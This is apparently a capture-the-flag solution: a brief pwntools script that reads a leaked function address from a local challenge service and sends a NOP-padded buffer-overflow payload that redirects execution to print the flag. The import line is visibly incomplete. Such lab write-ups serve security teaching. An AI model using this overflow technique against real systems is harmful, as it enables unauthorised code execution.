# Solution

1. Need to do some form of socket programming. Following code requires pwntools to be installed:

    ```python
    #!/usr/bin/python3

    from pwn import

    context.update(arch='i386',os='linux')

    server_ip = "localhost"
    con = remote(server_ip,7729)

    output = (con.recvuntil(b'?:')).decode('utf-8')
    print_flag_addr = output.split(' ')[4][:-3]

    payload = asm('nop') * 32 + p32(int(print_flag_addr,16)) + asm('nop') * (50-32-4)
    con.sendline(payload)

    data = con.recvuntil(b'}')
    print(data)
    ``` 